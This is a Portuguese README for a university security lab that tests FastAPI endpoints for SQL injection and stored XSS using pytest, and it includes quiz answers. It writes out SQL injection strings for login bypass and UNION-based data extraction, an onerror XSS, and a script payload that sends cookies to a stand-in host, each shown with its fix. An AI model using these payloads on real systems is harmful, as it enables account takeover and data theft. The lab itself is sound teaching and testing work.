# Laboratório Prático: Testes contra Injeção de SQL e XSS em APIs (OWASP)

Projeto prático desenvolvido com base na aula da Fatec: **Segurança Ofensiva Básica OWASP - Testes Práticos contra Injeção de SQL e XSS em APIs**.

O objetivo deste laboratório é auditar vulnerabilidades críticas introduzidas por implementações ingênuas (comumente sugeridas por IAs sem revisão humana) na API do **Hub Solidário**, desenvolver suítes de testes ofensivos e defensivos utilizando o padrão **AAA** (*Arrange, Act, Assert*) com `pytest` e `FastAPI TestClient`, e aplicar as devidas mitigações recomendadas pelas diretrizes da **OWASP**.

---

## 🛠️ Tecnologias e Ferramentas

- **Python 3.14+**
- **FastAPI**: Criação dos endpoints da API (vulneráveis e seguros).
- **SQLite (In-Memory)**: Banco de dados relacional para demonstração controlada.
- **Pytest**: Framework para automação de testes de segurança.
- **Httpx / FastAPI TestClient**: Cliente de teste para requisições HTTP internas.
- **uv**: Gerenciador de dependências e ambientes virtuais ultrarrápido.

---

## 📁 Estrutura do Projeto

```text
lab-seguranca-owasp/
├── .gitignore
├── .python-version
├── pyproject.toml         # Configuração de dependências, markers e filtros do pytest
├── uv.lock
├── main.py                # Implementação das rotas vulneráveis e seguras
├── README.md              # Documentação completa e resolução dos quizzes
└── tests/
    └── test_seguranca.py  # Casos de teste ofensivos e defensivos (padrão AAA)
```

---

## 🛡️ Vulnerabilidades e Mitigações Implementadas

### 1. Injeção de SQL (OWASP A03: Injection)
- **Causa Raiz**: Concatenação direta de entradas não confiáveis em consultas SQL via interpolação de strings (f-strings).
  ```python
  # Inseguro:
  query = f"SELECT id, nome, email, is_admin FROM usuarios WHERE email = '{dados.email}' AND senha = '{dados.senha}'"
  ```
- **Vetor Ofensivo**: `admin@hubsolidario.org' --`
  - Subverte a lógica da cláusula `WHERE`, comentando o restante da checagem de senha e autenticando o atacante com privilégios de administrador.
- **Mitigação Defensiva**: Uso de **Consultas Parametrizadas (Prepared Statements)** com marcadores posicionais (`?`).
  ```python
  # Seguro:
  query = "SELECT id, nome, email, is_admin FROM usuarios WHERE email = ? AND senha = ?"
  cursor.execute(query, (dados.email, dados.senha))
  ```

---

### 2. Cross-Site Scripting - Stored XSS (OWASP A03 / LLM02)
- **Causa Raiz**: Persistência e reflexão de dados fornecidos pelo usuário sem higienização ou codificação de entidades HTML.
  ```python
  # Inseguro:
  cursor.execute("INSERT INTO comentarios (autor, conteudo) VALUES (?, ?)", (dados.autor, dados.conteudo))
  return {"autor": dados.autor, "conteudo": dados.conteudo}
  ```
- **Vetor Ofensivo**: `<script>fetch('http://malicioso.com?cookie=' + document.cookie)</script>`
- **Mitigação Defensiva**: Sanitização contextual de saída com `html.escape()`. Caracteres reservados (`<`, `>`, `&`, `"`, `'`) são transformados em entidades seguras como `&lt;` e `&gt;`.
  ```python
  # Seguro:
  autor_seguro = html.escape(dados.autor.strip())
  conteudo_seguro = html.escape(dados.conteudo.strip())
  ```

---

### 3. Extração de Dados via UNION SELECT (Exercício 1)
- **Causa Raiz**: Concatenação em cláusulas `LIKE` (`LIKE '%{termo}%'`).
- **Vetor Ofensivo**: `%' UNION SELECT id, email, senha FROM usuarios --`
- **Mitigação Defensiva**: Parametrização passando o coringa `%` junto ao argumento do Prepared Statement:
  ```python
  query = "SELECT id, titulo, meta FROM campanhas WHERE titulo LIKE ?"
  cursor.execute(query, (f"%{termo}%",))
  ```

---

### 4. Bypass de Filtros XSS com Manipulador de Eventos (Exercício 2)
- **Causa Raiz**: Filtros ingênuos que apenas filtram a palavra `script`.
- **Vetor Ofensivo**: `<img src="invalido" onerror="alert(1)">`
- **Mitigação Defensiva**: Codificação com `html.escape()` neutraliza a tag antes da renderização no cliente:
  ```python
  assert "<img" not in conteudo
  assert "&lt;img" in conteudo
  ```

---

## 🧪 Executando os Testes Automatizados

Para executar toda a suíte de testes de segurança com o `uv`:

```bash
uv run pytest -v
```

Ou executando apenas os testes marcados com `@pytest.mark.security`:

```bash
uv run pytest -m security -v
```

### Saída Esperada:

```text
tests/test_seguranca.py::test_deve_comprovar_vulnerabilidade_de_sql_injection PASSED [ 14%]
tests/test_seguranca.py::test_deve_comprovar_vulnerabilidade_de_xss PASSED           [ 28%]
tests/test_seguranca.py::test_deve_comprovar_vulnerabilidade_union_select PASSED     [ 42%]
tests/test_seguranca.py::test_endpoint_seguro_deve_bloquear_sql_injection PASSED     [ 57%]
tests/test_seguranca.py::test_endpoint_seguro_deve_sanitizar_tags_xss PASSED         [ 71%]
tests/test_seguranca.py::test_deve_rejeitar_extracao_union_select PASSED             [ 85%]
tests/test_seguranca.py::test_deve_bloquear_xss_com_evento_onerror PASSED           [100%]

============================== 7 passed in 0.34s ==============================
```

---

## ✅ Checkpoints de Autoavaliação do Laboratório

- [x] A conexão com o banco de dados SQLite não concatena strings diretamente em nenhuma consulta.
- [x] Todas as rotas de busca e login utilizam consultas parametrizadas (*Prepared Statements* com `?`).
- [x] Todo conteúdo textual fornecido por usuários é codificado com `html.escape()` antes da persistência ou reflexão na resposta.
- [x] Os testes utilizam o padrão AAA (*Arrange, Act, Assert*) com marcadores `@pytest.mark.security`.
- [x] As tentativas de exploração com cargas hostis retornam erros semânticos (ex: 401 Unauthorized) sem vazar rastros de pilha (*stack traces*).
- [x] Todos os testes automatizados da suíte foram executados com `uv run pytest` e obtiveram aprovação com 100% de sucesso.

---

## 📝 Respostas dos Quizzes de Fixação

### Questão 1
> **Pergunta:** Por que a concatenação direta de parâmetros de entrada em instruções SQL (ex: `f"SELECT * FROM usuarios WHERE id = '{id}'"`) é uma prática perigosa?
>
> **Resposta Correta:** **Porque permite que o usuário envie caracteres especiais (como aspas simples e comentários) que alteram a sintaxe e a lógica do interpretador SQL, executando instruções arbitrárias.**
>
> *Justificativa:* A injeção ocorre porque o interpretador SQL não distingue dados de comandos de controle se ambos forem fornecidos como uma única string.

---

### Questão 2
> **Pergunta:** Qual é o mecanismo técnico correto para prevenir completamente vulnerabilidades de Injeção de SQL em aplicações com banco relacional?
>
> **Resposta Correta:** **Utilizar Consultas Parametrizadas (Prepared Statements), nas quais os dados do usuário são enviados separadamente e tratados exclusivamente como valores literais pelo banco de dados.**
>
> *Justificativa:* Prepared Statements compilam o comando SQL previamente no banco. Quando os parâmetros são enviados em um canal separado, o banco trata-os estritamente como texto/valor literal, anulando qualquer efeito sintático de aspas ou comandos SQL embutidos.

---

### Questão 3
> **Pergunta:** Qual é a principal diferença entre o XSS Armazenado (Stored XSS) e o XSS Refletido (Reflected XSS)?
>
> **Resposta Correta:** **No XSS Armazenado, o script malicioso é persistido no banco de dados e afeta qualquer usuário que visualize aquele registro posteriormente; no XSS Refletido, o payload viaja na requisição atual e é devolvido imediatamente na resposta do servidor.**
>
> *Justificativa:* O Stored XSS é perene e atinge múltiplas vítimas sem necessidade de que cliquem em links forjados para cada requisição, enquanto o Reflected XSS requer que o payload seja enviado ativamente pelo cliente para ser refletido na mesma resposta.

---

### Questão 4
> **Pergunta:** Em uma suíte de testes de segurança automatizada com o pytest, qual deve ser a asserção esperada ao enviar uma carga de injeção de SQL (`' OR '1'='1`) para o endpoint de autenticação de uma API segura?
>
> **Resposta Correta:** **Status HTTP 401 Unauthorized rejeitando categoricamente o login.**
>
> *Justificativa:* A API segura trata a entrada como literal, não encontra um usuário cujo e-mail seja exatamente a string enviada, e rejeita categoricamente o acesso com o status HTTP correspondente à falha de autenticação (401), sem expor erros internos de servidor (500).

